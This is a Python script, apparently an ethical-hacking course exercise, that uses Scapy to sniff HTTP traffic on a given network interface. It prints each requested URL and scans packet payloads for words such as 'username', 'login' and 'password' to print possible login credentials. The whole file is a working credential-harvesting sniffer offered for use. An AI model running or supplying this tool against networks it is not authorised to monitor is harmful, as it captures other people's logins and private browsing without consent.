#!/usr/bin/env python3

import sys
import scapy.all as scapy
from scapy.layers import http
import argparse

def get_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i","--interface",dest="interface",help="Input the interface you want to sniff packets from.")
    options = parser.parse_args()
    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False,prn=process_sniffed_packet)

def get_URL(packet):
    return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            try:
                load = packet[scapy.Raw].load.decode('utf-8')
                keywords = ["username","usern","login",'password','pass']
                for keyword in keywords:
                    if keyword in load:
                        return load
            except UnicodeDecodeError:
                pass
    
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_URL(packet)
        print("[+]HTTP Request: "+url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+]Possible Username and Password: "+login_info+"\n\n")

def main():
    if len((sys.argv)) > 1:
        options = get_argument()
        sniff(options.interface)
    else:
        print("Please input the arguments ... !")
        print("./packet-sniffer --help --> to view the help menu !")

if __name__ == "__main__":
    main()

